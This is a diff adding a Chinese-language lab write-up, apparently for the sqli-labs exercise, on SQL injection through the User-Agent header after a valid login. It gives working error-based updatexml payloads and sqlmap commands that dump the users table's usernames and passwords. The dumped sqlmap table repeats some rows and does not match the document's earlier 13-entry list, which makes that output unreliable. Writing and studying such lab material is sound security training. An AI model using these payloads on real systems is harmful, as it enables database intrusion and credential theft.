@@ -1,0 +1,86 @@
+uname=admin&passwd=123&submit=Submit
+登录成功，会显示user-agent相关的信息
+uname=admin' --+&passwd=12&submit=Submit
+显示登录失败
+uname=admin" --+&passwd=12&submit=Submit
+显示登录失败
+于是推测对uname进行了过滤
+uname=admin&passwd=12' --+&submit=Submit
+显示登录失败
+uname=admin&passwd=12” --+&submit=Submit
+显示登录失败
+于是推测对passwd也进行了过滤
+综上，在uname和passwd不存在注入点，并且说明要输入正确的账号和密码才能绕过账号密码判断，进入处理User-Agent部分。这跟现实中的注册登录再注入是比较贴合。注入点在User-Agent处
+查看php文件，发现果然如此
+
+方法一：
+1.数据库名
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' and updatexml(1,concat(0x7e,(select database()),0x7e),1) or '1'='1
+2.表名
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),0x7e),1) or '1'='1
+3.字段名
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e),1) or '1'='1
+4.字段值
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) or '1'='1
+显示范围有限，故修改limit范围来遍历显示信息，编写脚本
+字段值
+Dumb:1
+Angelina:1
+Dummy:1
+secure:1
+stupid:1
+superman:1
+batman:1
+admin:123
+admin1:1
+admin2:1
+admin3:1
+dhakkan:1
+admin4:1
+
+方法二：
+把User-Agent改为*
+User-Agent: *
+sqlmap -r raw.txt --technique E --batch --current-db
+current database: 'security'
+sqlmap -r raw.txt --technique E --batch -D security --tables
+Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+sqlmap -r raw.txt --technique E --batch -D security -T users --columns
+Database: security
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+
+sqlmap -r raw.txt --technique E --batch -D security -T users -C username,password --dump
+Database: security
+Table: users
+[13 entries]
++----------+----------+
+| username | password |
++----------+----------+
+| admin4   | 1        |
+| Angelina | 1        |
+| Dummy    | 1        |
+| secure   | 1        |
+| stupid   | 1        |
+| superman | 1        |
+| batman   | 1        |
+| admin4   | 1        |
+| Angelina | 1        |
+| Angelina | 1        |
+| Angelina | 1        |
+| admin4   | 1        |
+| admin    | 123      |
++----------+----------+
